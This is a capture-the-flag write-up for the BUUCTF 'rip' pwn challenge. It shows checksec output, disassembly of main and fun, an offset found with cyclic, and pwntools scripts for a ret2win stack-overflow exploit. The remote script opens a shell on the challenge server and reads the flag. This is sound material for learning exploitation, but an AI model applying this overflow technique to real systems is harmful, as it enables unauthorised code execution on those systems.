# 2. rip

![Untitled](2%20rip%20a8ff965b02f04e509fb90f670a49aef3/Untitled.png)

Normal execution

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/rip$ ./pwn1 
please input
a
a
ok,bye!!!
```

Checksec

```python
pwndbg> checksec
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/rip/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Func

```python
pwndbg> info func
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  gets@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401142  main
0x0000000000401186  fun
0x00000000004011a0  __libc_csu_init
0x0000000000401200  __libc_csu_fini
0x0000000000401204  _fini
```

Disassembly of main

```python
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000401142 <+0>:	push   rbp
   0x0000000000401143 <+1>:	mov    rbp,rsp
   0x0000000000401146 <+4>:	sub    rsp,0x10
   0x000000000040114a <+8>:	lea    rdi,[rip+0xeb3]        # 0x402004
   0x0000000000401151 <+15>:	call   0x401030 <puts@plt>
   0x0000000000401156 <+20>:	lea    rax,[rbp-0xf]
   0x000000000040115a <+24>:	mov    rdi,rax
   0x000000000040115d <+27>:	mov    eax,0x0
   0x0000000000401162 <+32>:	call   0x401050 <gets@plt>
   0x0000000000401167 <+37>:	lea    rax,[rbp-0xf]
   0x000000000040116b <+41>:	mov    rdi,rax
   0x000000000040116e <+44>:	call   0x401030 <puts@plt>
   0x0000000000401173 <+49>:	lea    rdi,[rip+0xe97]        # 0x402011
   0x000000000040117a <+56>:	call   0x401030 <puts@plt>
   0x000000000040117f <+61>:	mov    eax,0x0
   0x0000000000401184 <+66>:	leave  
   0x0000000000401185 <+67>:	ret    
End of assembler dump.
```

Disassembly of fun

```python
pwndbg> disass fun
Dump of assembler code for function fun:
   0x0000000000401186 <+0>:	push   rbp
   0x0000000000401187 <+1>:	mov    rbp,rsp
   0x000000000040118a <+4>:	lea    rdi,[rip+0xe8a]        # 0x40201b
   0x0000000000401191 <+11>:	call   0x401040 <system@plt>
   0x0000000000401196 <+16>:	nop
   0x0000000000401197 <+17>:	pop    rbp
   0x0000000000401198 <+18>:	ret    
End of assembler dump.
```

func at 

0x0000000000401186

get offset

```python
pwndbg> cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
pwndbg> r
Starting program: /home/wayell/Desktop/CTF/BUUCTF/pwn/rip/pwn1 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
please input
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
ok,bye!!!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401185 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
───────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────
 RAX  0x0
 RBX  0x4011a0 (__libc_csu_init) ◂— push   r15
 RCX  0x7ffff7ec9077 (write+23) ◂— cmp    rax, -0x1000 /* 'H=' */
 RDX  0x0
 RDI  0x7ffff7fa97e0 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x4052a0 ◂— 'ok,bye!!!\naadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa\n'
 R8   0xa
 R9   0x0
 R10  0xfffffffffffff3d4
 R11  0x246
 R12  0x401060 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffe020 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x6161666161616561 ('aeaaafaa')
 RSP  0x7fffffffdf38 ◂— 'agaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
 RIP  0x401185 (main+67) ◂— ret    
────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────
 ► 0x401185 <main+67>    ret    <0x6161686161616761>

─────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdf38 ◂— 'agaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
01:0008│     0x7fffffffdf40 ◂— 'aiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
02:0010│     0x7fffffffdf48 ◂— 'akaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
03:0018│     0x7fffffffdf50 ◂— 'amaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
04:0020│     0x7fffffffdf58 ◂— 'aoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0028│     0x7fffffffdf60 ◂— 'aqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0030│     0x7fffffffdf68 ◂— 'asaaataaauaaavaaawaaaxaaayaaa'
07:0038│     0x7fffffffdf70 ◂— 'auaaavaaawaaaxaaayaaa'
───────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────
 ► f 0         0x401185 main+67
   f 1 0x6161686161616761
   f 2 0x61616a6161616961
   f 3 0x61616c6161616b61
   f 4 0x61616e6161616d61
   f 5 0x6161706161616f61
   f 6 0x6161726161617161
   f 7 0x6161746161617361
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/wx $rsp
0x7fffffffdf38:	0x61616761
pwndbg> cyclic -l 0x61616761
23
```

Remote

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('pwn1')
p = remote('node4.buuoj.cn',28814)
#p = process()

# Number of padding bytes (to offset RIP)
padding = 23

# Crafting payload, contains x nops of padding, ret, address of ret2win using symbols function
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	elf.symbols['fun'],
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

# Send payload after asked for input
#p.recv()

p.sendline(payload)

p.interactive()
```

Run remotely

```python
wayell@wayell:~/Desktop/CTF/BUUCTF/pwn/rip$ python3 solve.py 
[*] '/home/wayell/Desktop/CTF/BUUCTF/pwn/rip/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Opening connection to node4.buuoj.cn on port 28814: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag
flag{2c713ca4-2ab6-4a91-ba10-ca77bdc56051}
```

local exec

```python
from pwn import *

# Set up pwntools to work with this binary
elf = context.binary = ELF('pwn1')
p = process()

# Number of padding bytes (to offset RIP)
padding = 23

# Crafting payload, contains x nops of padding, ret, address of ret2win using symbols function
payload = flat(
	asm('nop') * padding,
	next(elf.search(asm('ret'))),
	elf.symbols['fun'],
)

# Writing payload to file on same directory
f = open("payload", "wb")
f.write(payload)

# Send payload after asked for input
p.recv()

p.sendline(payload)

p.interactive()
```